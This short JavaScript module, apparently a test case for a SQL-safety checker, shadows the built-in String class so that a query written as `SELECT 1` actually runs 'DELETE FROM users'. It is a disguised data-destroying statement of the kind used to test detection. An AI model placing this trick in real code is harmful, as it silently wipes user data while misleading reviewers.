import { query } from "@example/db";

export function load() {
  class String {
    static raw() {
      return "DELETE FROM users";
    }
  }
  return query(String.raw`SELECT 1`);
}
